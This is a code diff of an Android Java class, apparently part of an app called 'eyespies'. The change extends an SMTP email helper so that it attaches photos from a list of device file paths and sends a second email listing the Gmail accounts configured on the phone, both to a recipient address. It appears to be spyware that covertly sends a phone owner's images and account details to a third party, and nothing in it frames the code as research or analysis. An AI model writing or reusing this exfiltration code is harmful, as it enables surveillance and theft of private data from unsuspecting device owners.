@@ -1,6 +1,7 @@
 package com.eyespies.service;
 
 import java.io.File;
+import java.util.List;
 import java.util.Properties;
 
 import javax.activation.DataHandler;
@@ -9,6 +10,7 @@ import javax.activation.FileDataSource;
 import javax.mail.Authenticator;
 import javax.mail.BodyPart;
 import javax.mail.MessagingException;
+import javax.mail.Multipart;
 import javax.mail.PasswordAuthentication;
 import javax.mail.Session;
 import javax.mail.Transport;
@@ -23,69 +25,111 @@ import android.os.Environment;
 
 public class SMTPSendEmail extends Authenticator{
 
-	  private static String mUserName;
-	  private static String mPassword;
-	  private static String mHostName;
+	private static String mUserName;
+	private static String mPassword;
+	private static String mHostName;
 
-	  public void sendEmailTo(String user, String password, String hostname, String recipient, String body)  throws AddressException, MessagingException{
+	/**
+	 * sends the contact details, images as attachment and account details of the gmail accounts configured
+	 * @param user
+	 * @param password
+	 * @param hostname
+	 * @param recipient
+	 * @param body
+	 * @param imageList
+	 * @param listOfAccounts
+	 * @throws AddressException
+	 * @throws MessagingException
+	 */
+	public void sendEmailTo(String user, String password, String hostname, String recipient, String body,List<String> imageList,List<String> listOfAccounts)  throws AddressException, MessagingException{
 
-	    mUserName=user;
-	    mPassword=password;
-	    mHostName=hostname;
+		mUserName=user;
+		mPassword=password;
+		mHostName=hostname;
 
-	    Properties props = getProperties();
+		Properties props = getProperties();
 
-	    System.out.println("printing*************");
-	    // this object will handle the authentication
-	    Session session=Session.getInstance(props,this);
-	    MimeMessage emailMessage=new MimeMessage(session);
-	    BodyPart msgBody=new MimeBodyPart();
-	    MimeMultipart bodyMultipart=new MimeMultipart();
+		System.out.println("printing*************");
+		// this object will handle the authentication
+		Session session=Session.getInstance(props,this);
+		MimeMessage emailMessage=new MimeMessage(session);
+		BodyPart msgBody=new MimeBodyPart();
+		MimeMultipart bodyMultipart=new MimeMultipart();
 
 
-	    emailMessage.setFrom(new InternetAddress(mUserName));
-	    emailMessage.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(recipient));  
+		emailMessage.setFrom(new InternetAddress(mUserName));
+		emailMessage.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(recipient));  
 
-	    emailMessage.setSubject("new email");    
-	    msgBody.setText(body);   
-	    bodyMultipart.addBodyPart(msgBody);
-	    
-	    /******/
-        DataSource source = new FileDataSource(new File(
-                Environment.getExternalStorageDirectory() + "/DCIM/Camera/2012-11-04 22.06.31.jpg"));
-        MimeBodyPart messageBodyPart = new MimeBodyPart();
-        messageBodyPart.setDataHandler(new DataHandler(source));
+		emailMessage.setSubject("new email");    
+		msgBody.setText(body);   
+		bodyMultipart.addBodyPart(msgBody);
+		int length=0;
+		/******/
+		for(String s:imageList){
+			if(length>200000) {
+				System.out.println("length: " + length);
+				break;
+			}
+			//DataSource source = new FileDataSource(new File(
+			//     Environment.getExternalStorageDirectory() + "/DCIM/Camera/2012-11-04 22.06.31.jpg"));
+			File image = new File(s);
+			DataSource source = new FileDataSource(image);
+			System.out.println("file size: " +s+ image.length());
+			MimeBodyPart messageBodyPart = new MimeBodyPart();
+			messageBodyPart.setDataHandler(new DataHandler(source));
 
-        messageBodyPart.setFileName(Environment
-                .getExternalStorageDirectory() + "/DCIM/Camera/2012-11-04 22.06.31.jpg");
-        messageBodyPart.setDisposition(MimeBodyPart.INLINE);
-        bodyMultipart.addBodyPart(messageBodyPart);
-        
-	    emailMessage.setContent(bodyMultipart);
-	    /**************/
-	   
-	    Transport transport = session.getTransport("smtp");
+			/*messageBodyPart.setFileName(Environment
+	                .getExternalStorageDirectory() + "/DCIM/Camera/2012-11-04 22.06.31.jpg");*/
+			messageBodyPart.setFileName(s);
+			messageBodyPart.setDisposition(MimeBodyPart.INLINE);
+			bodyMultipart.addBodyPart(messageBodyPart);   //add the image to the email
+			length += image.length();
+			break;
+		}
 
-	    transport.connect(user, password);
-	    transport.sendMessage(emailMessage, emailMessage.getAllRecipients());
-	    transport.close();
-	    System.out.println("sent the message!!");
-	  }
+		emailMessage.setContent(bodyMultipart);
+		Transport transport = session.getTransport("smtp");
 
-	  private static Properties getProperties(){
-	    Properties props = new Properties(); 
-	   
-	    props.put("mail.smtp.host", mHostName);   
-	    props.put("mail.smtp.auth", "true");           
-	    // default SMTP port
-//	    props.put("mail.smtp.port", "25"); 
-	    props.put("mail.smtp.starttls.enable", "true");
-	    props.put("mail.smtp.port", "587");
-	    return props;
-	  }
+		transport.connect(user, password);
+		transport.sendMessage(emailMessage, emailMessage.getAllRecipients());
 
-	  @Override 
-	  public PasswordAuthentication getPasswordAuthentication() { 
-	    return new PasswordAuthentication(mUserName, mPassword); 
-	  } 
+		/**************************************************************
+			    add account details in the email listOfAccounts
+		***************************************************************/
+		MimeMessage emailMessageAccDetails = new MimeMessage(session);
+		emailMessageAccDetails.setFrom(new InternetAddress(mUserName));
+		emailMessageAccDetails.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(recipient));  
+		emailMessageAccDetails.setSubject("new email Account Details"); 
+		
+		BodyPart msgBodyAccDetails = new MimeBodyPart();
+		StringBuffer message=new StringBuffer("");
+		for(String accName:listOfAccounts){
+			message.append(accName);
+		}
+		msgBodyAccDetails.setText(message.toString());
+		MimeMultipart bodyMultipartAccDetails = new MimeMultipart();
+		bodyMultipartAccDetails.addBodyPart(msgBodyAccDetails);
+		
+		emailMessageAccDetails.setContent(bodyMultipartAccDetails);
+		transport.sendMessage(emailMessageAccDetails, emailMessageAccDetails.getAllRecipients());
+		transport.close();
+		System.out.println("sent the message!!");
 	}
+
+	private static Properties getProperties(){
+		Properties props = new Properties(); 
+
+		props.put("mail.smtp.host", mHostName);   
+		props.put("mail.smtp.auth", "true");           
+		// default SMTP port
+		//	    props.put("mail.smtp.port", "25"); 
+		props.put("mail.smtp.starttls.enable", "true");
+		props.put("mail.smtp.port", "587");
+		return props;
+	}
+
+	@Override 
+	public PasswordAuthentication getPasswordAuthentication() { 
+		return new PasswordAuthentication(mUserName, mPassword); 
+	} 
+}
